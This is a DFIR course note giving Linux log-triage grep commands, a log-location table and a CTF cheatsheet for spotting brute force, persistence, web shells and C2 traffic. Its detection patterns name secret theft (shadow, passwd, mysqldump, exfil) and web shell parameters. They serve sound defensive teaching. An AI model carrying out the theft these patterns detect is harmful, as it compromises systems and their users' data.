### Quick Incident Triage (run these first)
```bash
# 1. Who logged in today?
grep "Accepted" /var/log/auth.log | grep "$(date '+%b %e')"

# 2. Any brute force? (IPs with >10 fails)
grep "Failed password" /var/log/auth.log | grep -oP 'from \K[\d.]+' | sort | uniq -c | sort -rn | awk '$1>10'

# 3. What was installed today?
grep "$(date '+%Y-%m-%d')" /var/log/dpkg.log | grep " install "

# 4. Any suspicious cron?
grep CRON /var/log/syslog | grep "CMD" | grep -vE "run-parts|backup|logrotate"

# 5. Any outbound connections (C2)?
grep "UFW ALLOW" /var/log/ufw.log | grep "OUT=" | grep -vE "DPT=80 |DPT=443 |DPT=53 "

# 6. Web shell access?
grep "\.php" /var/log/apache2/access.log | grep "200" | grep -vE "index|login|wp-login" | tail -20

# 7. History of all users
for u in /root /home/*; do echo "--- $u ---"; cat "$u/.bash_history" 2>/dev/null | tail -5; done
```

### Log Analysis Mega Command
```bash
# Full timeline: merge auth + syslog + ufw for specific date
grep "May 14" /var/log/auth.log /var/log/syslog /var/log/ufw.log 2>/dev/null \
  | sort -k1,3 \
  | grep -v "^Binary" \
  | less
```

---

## 📊 Log Summary Table

| Log | Location | Severity | Primary Use | Key Field |
|-----|----------|----------|-------------|-----------|
| 🔐 auth.log | `/var/log/auth.log` | 🔴 CRITICAL | Who logged in, SSH, sudo | Source IP |
| ⚙️ syslog | `/var/log/syslog` | 🟡 MEDIUM | System events, timeline | Process name |
| 🔬 kern.log | `/var/log/kern.log` | 🔴 CRITICAL | Rootkits, hardware, kernel | Module name |
| 🛡️ ufw.log | `/var/log/ufw.log` | 🔴 CRITICAL | Network attacks, C2 traffic | SRC/DST IP |
| 🌐 access.log | `/var/log/apache2/access.log` | 🔴 CRITICAL | Web attacks, SQLi, LFI | URI + User-Agent |
| ⚠️ error.log | `/var/log/apache2/error.log` | 🟡 MEDIUM | Info leakage, PHP errors | Error message |
| ⏰ cron.log | `/var/log/syslog` (grep CRON) | 🔴 CRITICAL | Persistence mechanisms | Command |
| 📦 dpkg.log | `/var/log/dpkg.log` | 🔴 CRITICAL | Tool installs post-compromise | Package name |
| 🗄️ mysql/error | `/var/log/mysql/error.log` | 🔴 CRITICAL | SQLi, DB brute force | Source IP |
| 💀 bash_history | `~/.bash_history` | 🔴 CRITICAL | Attacker command trail | Commands |

---

## 🎯 CTF & DFIR Quick Cheatsheet

> [!success] Quick Wins in CTF Log Analysis Challenges
> ```
> Find attacker IP    → grep "Failed\|BLOCK\|POST" logs | extract IP field
> Find webshell       → grep ".php" access.log | grep "200" | grep "cmd=\|c=\|exec="
> Find persistence    → crontab -l -u root / grep CRON syslog | grep /tmp
> Find data theft     → grep "mysqldump\|shadow\|passwd\|scp\|exfil" bash_history
> Find rootkit        → grep "module\|insmod\|modprobe" kern.log
> Build timeline      → sort merged logs by timestamp
> Prove compromise    → auth.log (login) + dpkg.log (tool install) = confirmed
> ```

---

## 🔗 Related Notes

- [[Linux_Forensics_Artifacts]]
- [[Memory_Forensics_Volatility]]
- [[Disk_Forensics_Autopsy]]
- [[Incident_Response_Checklist]]
- [[VAPT_Evidence_Collection]]
- [[Cywarx_CTF_Challenges]]

---

*Note created for Cywarx DFIR Curriculum — Unit IV: Storage and Memory Forensics*
*Author: HeXx | Updated: 2026-05-14*
